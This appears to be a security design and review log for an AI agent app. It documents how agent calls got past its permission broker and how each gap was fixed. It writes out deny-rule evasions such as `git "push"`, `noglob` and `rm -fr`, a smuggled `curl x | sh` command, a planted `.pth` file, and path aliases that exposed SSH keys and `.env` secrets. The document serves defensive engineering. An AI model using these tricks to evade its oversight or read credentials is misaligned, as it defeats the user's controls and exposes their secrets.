**What comes back.** No rsync, whose receiver would run here against a hostile sender (OQ-034). A list of names and a tar stream, read as data by `internal/environment/sshsync.go`:

- Only a plain path that was asked for is applied, once. Names with control or invisible characters, `..`, or a component `~` are left there.
- Only regular files: no link, hard link, device or fifo is made. No file gains an executable bit, and a file executable here is not replaced.
- A path through a symlink here is refused, and writes pass the Guard, by absolute path.
- Sizes, counts and time are capped per file, sync and session, with no compression to expand. A machine that keeps sending is cut off.
- Held back, in any spelling APFS treats as the same and at any depth: `permission.ActedOnLater`, `.git`, `.freeloop`, `.agents`, CI and hook folders, `.gitignore` and `.gitattributes`, `AGENTS.md` and the like, installed code (`.venv`, `node_modules`, `site-packages`), secrets, what a deny rule covers, and a file named `HEAD`, or `config` beside one, which would make a bare repository git obeys.
- If the project's ignore rules cannot be read, nothing comes back.
- An edit here wins over what comes back. What is replaced or deleted is set aside first in a private folder of the session's, and a mass delete, in one step or several, is not applied.

**Not covered.** Project files a person runs on purpose still change, a `Makefile`, a test or `package.json` among them: that is what the agent is there for, and the diff shows it. Running them before reading it runs what the other machine wrote. Work there can also be wrong or malicious without touching any listed name. Files changed with their time and status put back on a file system that allows it, by root, are not seen. A machine that goes away leaves its copy, with the project's code, there.

An independent review of this code on 2026-11-04 attacked it with a real sshd, and reproduced these before they were fixed, each with a regression test in `internal/environment/ssh_test.go` or `internal/engine/ssh_test.go`:

- **The home folder through a path.** A path under a folder named `~` passed its check as `root/~/x` and was then read as `$HOME/x`, so `~/.zsh_history` and other files reached the other machine with no question. Paths are now absolute when they reach the file system, and such a name is refused.
- **Code run here by way of a name.** A file named `:(bogus)` made `git check-ignore` die, and the failure read as "ignored: nothing", so a `.pth` file came back into an ignored `.venv`, with `git status` empty, and ran at the next `python`. A failure now brings nothing back, names reach git as `./` paths, and installed code is held back whatever the rules say.
- **Secrets through the rules.** Emptying `.gitignore` over there emptied it here, and the next sync sent every ignored file. `.gitignore` no longer comes back. Any git failure also fell back to sending the whole tree; only git saying this is not a repository does now.
- **What the app already knew.** The list missed `permission.ActedOnLater`, and an executable script could be replaced and stay executable.
- **Smaller.** A mass delete could be done 25 files at a time. A quadratic loop over a remote list could not be stopped. A stopped command's sync held the session for the whole limit. A linked session folder had its target's mode changed. A variable named `__fl_cmd` replaced the approved command. Deleting a session connected to a machine whose environment file had changed since it was approved.

A second round of that review, against the fixes, did not complete. Each fix has a regression test, and reading the fixes afterwards found two more: a `.git` that git rejects read as "not a repository" and sent the whole tree, and one path through a link here stopped the whole sync. Both are fixed. The fixes have not had an independent attack.

## Closing the accepted risks, 2026-11-08

Every risk the reviews above had accepted as low or left open is fixed, each with a test that failed or hung on the old code.

- **A guard hook that fails.** A `pre_tool_use` or `permission_request` hook that times out, cannot start, is killed or exits other than 0 or 2 has not answered, so the call goes to the user in every mode, bypass included, and over allow rules; the request names the hook and how it failed, on the approval card and in the attention view. A failure never allows or denies by itself; exit 2 still denies, and deny rules and protected paths still win before any hook runs. A hook that exits 1 as a warning, which Claude Code treats as going on, now asks.
- **A hook arriving after trust.** Trusting a project approves its hooks as one set (`.freeloop/hooks.yaml` and its profiles' hooks) with the app-computed mark other approvals use. A set that differs since runs nothing until approved in Settings, Permissions, and the session says so; distrusting ends the approval. Hooks that trusted projects already held when this shipped were approved once, since they ran before. A project going back to a set approved earlier runs it without asking again.
- **"Allow always" and a cancel.** Answering and cancelling a request now exclude each other, so "Allow always" saves its rule only when its answer is the request's decision; a cancel during the save waits for it, and a save that fails leaves the request cancelled or waiting, with no rule.
- **Making folders.** The file tools make missing folders one at a time inside the already-open parent and open the file inside the last, never following a link (`createNoFollow`), so a folder swapped for a link mid-write makes the write fail. The old code lost about one write in 60 to a swap loop; the new code lost none. A folder that can be entered but not listed can no longer be written through.
- **An MCP sign-in cancelled by a stranger.** A request to the sign-in's loopback address that is not a GET of `/callback` with the sign-in's own `state` (compared in constant time) and a code or an error gets a 400 and is ignored; only the real redirect ends the wait, with the code or with the server's error. The listener has read, write and idle timeouts and a 16 KB header limit.
- **SSH's shared connection.** ssh puts its connection master in a process group of its own, which neither stopping a session nor the crash ledger reached. The app now learns its pid with `ssh -O check`, records it in the process ledger, asks it to exit when the session ends or the app quits, stops its group if it does not, and removes a socket it left; a start that failed ends its connection too. After a crash it lasts until its 60-second idle limit or the next launch, whichever is first.
- **Hostile Markdown.** Runs of backticks, unclosed brackets, and a line of spaces after a fence or table row froze the window for seconds to minutes (about 40 s at 200,000 characters). The parser is now linear in the text (`markdown.test.ts` checks 23 such inputs at 200,000 characters), and a streamed reply is parsed again only from its last finished block, where every chunk used to parse the whole reply.
- **Development switches.** The build users get (`make dmg`, `make release`, the release job) is linked with `-X main.shipped=1` and reads none of `FREELOOP_DEV`, `FREELOOP_DEV_*`, `FREELOOP_RELEASE_API` and `FREELOOP_HOME`, logging only their names if set; development builds and `make package` keep them. The architecture test keeps every read of a `FREELOOP_` variable in `cmd/freeloop` behind one function.

Also on 2026-11-08: the app is built for Apple Silicon only (NFR-XPLAT-001), and the app check's driver holds off App Nap, the likeliest cause of the session that took over 30 s to open on CI in about one run in four. Four runs here under load did not reproduce it, so that cause is not proven.

## Workflows and unattended runs, 2026-11-08

A workflow (WFL-001 to WFL-006) adds work that runs while nobody watches, so it adds no way around the broker. ## Review, 2026-11-11: one place with two names (issue 033)

A review before the repository went public found that a path's second spelling got past the protected locations. On a Mac `/System/Volumes/Data/Users/me/.ssh/id_ed25519` is `/Users/me/.ssh/id_ed25519`; the name is a mount and not a link, so resolving symlinks left it alone and the policy compared strings. Reproduced with `freeloop check read_file`: the plain path was denied and the other only asked, and in bypass mode, or under a broad read rule, was read without a question, for `~/.ssh`, the app's data folder and the vendors' credential files alike. Fixed in `environment.Unaliased`, which every path check and every resolution now goes through: `Resolve`, `Canonical`, a project's root, the policy's `within` and `pathParts`, and path rules, whether the rule or the path carries the name. Tests: `internal/environment/alias_test.go`, `internal/permission/alias_test.go` (the policy, the rules and the environment's file tools and search) and `TestCheckPolicyHoldsThroughTheDataVolume`, each seen to fail with the fix switched off.

The same kind of second name on the other systems, looked at:

- **Windows, `\\?\C:\...` and `\\?\UNC\...`.** Not links either, and not handled before; the prefix is dropped (a test with the system as a parameter, since no Windows machine has run this; issue 055). `\\?\Volume{...}` and device paths are left as they are and so fall outside every root.

### `grep` and a secret's name (issue 034)

SEC-017 asks before a file with a secret's name (`.env`, `*.pem`, `id_ed25519`, `secrets.yaml`, `.aws/`) is read, but the check saw only the paths a request named, and `grep` names a folder: `grep` with `include: ".env"` returned its lines in ask mode with no question (reproduced by a test, 2026-11-11). The built-in `grep` now leaves such files out of a search over a folder and lists them in its result, so the model knows; it asks, as a read does, when the path or the include names them (an include such as `.env`, `*.pem` or `**/secrets.yaml`), and then shows the lines. A rule that allows every search, and bypass mode, show them as a read does. One list of names (`environment.SecretPath`) serves the read check, the sync and the search. `glob` and `list_dir` still show a file's name, which holds nothing. An external agent's own search runs in its process and never reaches this; only the `fs/read_text_file` it asks of the app does, and that is a read of a named path.

### Command rules and the way a word is spelled (issue 035)

A shell deny rule unquoted only the first word of a command, so with `deny git push *` and `allow git *`, `git "push" origin main` was allowed by the rule in ask mode, and in a sandbox or bypass mode it ran unasked; `noglob git push`, `=git push` and `rm -fr` against `rm -rf *` got past too (reproduced by tests, 2026-11-11). Now:

- every word is read as the shell reads it (`'push'`, `"push"`, `pu""sh`, `p\ush`), zsh's `noglob` and `nocorrect` are wrappers, `=git` is `git`, and `eval`'s words are read as a line, as `sh -c`'s are;
- flag letters are read as a set, joined or split, in any order, and the command may carry more of them than the rule names: `rm -rf *` stops `rm -fr`, `rm -r -f`, `rm -rfv`, and `rm --recursive --force`, which rm's long names are made to read as. Other long options are not mapped: a rule on `--force` does not stop `-f`, since the two are different words to most programs;
- a command whose program, or the subcommand of a program a shell deny rule names, is built when it runs (`$a push`, `git "$sub"`, `$(echo git) push`, a glob in the program) cannot be compared with the rule. While such a rule could apply, no allow rule approves it, so it asks even with `allow shell`, and bypass mode refuses it, since a deny rule wins at every scope. Variables elsewhere in a command, such as `echo $HOME`, change nothing.

A rule is still a guard over the words of a command. It cannot see what a program does with its arguments: `make deploy` runs whatever the Makefile says, and a script runs its own lines. For that, a sandbox or a hook that reads the command (`profiles/`, `hooks/`) is the guard. Tests: `internal/permission/quoting_test.go`.

### The phone's key is not a cookie (issue 036)

The phone's key was the cookie `freeloop_device`. A browser sends a cookie to every port of a host, so any other service on the same tailnet name that the phone visited, a dev server running agent-written code for one, received it; replayed to `127.0.0.1:<port>` with a forged Origin and the app's header and no `Tailscale-User-Login`, the login check was skipped (it only compared when the header was present) and the phone's whole reach was open, to a command in a sandbox too (found by reading, 2026-11-11, and then shown by a test that sends the key as a cookie, with no login). Now:

- the key is the response to pairing, kept by the phone app in its own storage (`localStorage`, which is per origin, port included) and sent as `Authorization: Bearer`; a cookie is not read at all, and the server sets none;
- a phone paired with a login must send that login: without it, or under another, the key is refused. Tailscale adds the header on its own, and the header can still be sent by a local process, so it stays a second check; the key is the gate;
- a key unused for 90 days stops working (the cookie's lifetime, which was never enforced on the server);
- the streams are read with `fetch`, which can send the header, where `EventSource` cannot, so there is no ticket to leak; and signing a phone out cancels the streams it has open at once.

A phone paired with an earlier build holds a cookie nothing reads: it shows its pairing screen and pairs again; its old entry stays in the list until removed. What a command in a session's sandbox can do is as row 22 says: it can reach the port and gets nothing there without a key it cannot read. Tests: `internal/remote/server_test.go` (a key as a cookie, with no login, with another, stale, and a removed phone's stream), `frontend/src/phone/phone.test.ts` (the stream parser).

### An error while reading the policy asks or denies (issue 037)

Three places let a call through when something could not be read (found by reading, two of them then shown by tests, 2026-11-11): with `rules.yaml` unreadable, an in-project `.env` read was allowed unasked and a write in plan mode became a question where plan mode refuses it; a failed lookup of the session's project or profile dropped their guard hooks and ran the rest, where the same failure for rules fails closed; and a request of a session with no running runtime ran no hooks at all. Now:

- with unreadable rules only a plain read inside the project goes ahead unasked (a file with a secret's name asks), and a write in plan mode is refused, since no rule is needed to know the mode refuses it;
- a project or profile that cannot be looked up makes `runHooks` answer as a hook that did not, with the reason, which the broker turns into a question, in bypass mode too; the reason is on the approval card as for a hook that timed out;
- a request that names a session with no running runtime does the same; a request that names no session is unchanged;
- the log names each once (`engine: <session>: the session's profile could not be looked up…`), with no path contents.

A session whose profile was deleted while it runs now asks for every call, saying so, until the profile is restored or the session given another. That is the price of not guessing whether the missing profile held a guard.

### An approval covers the command shown; a write rule covers both write tools (issue 038)

Two more gaps in what a decision covers (both shown by tests, 2026-11-11). An external agent's approved command was matched to the terminal request it was for by splitting both on any white space, so an approval for `ls # curl x | sh` covered `ls #`, a newline and `curl x | sh`, which is two commands; it needed a hostile agent, which outside a sandbox can act on its own anyway. Now runs of spaces and tabs are one and the ends are trimmed, and a newline is not a space (`sameCommand`). And `deny write_file(secrets/**)` did not stop `edit_file`, which is also what an external agent's writes are judged as, so the model, or the agent, picked the other tool; now a deny rule on a path that names either holds for both (`Rule.toolMatches`). An allow rule is not widened the same way: `allow write_file(src/**)` allows `write_file` only, and the rules page says so. The sandbox's profile already covered both tools.
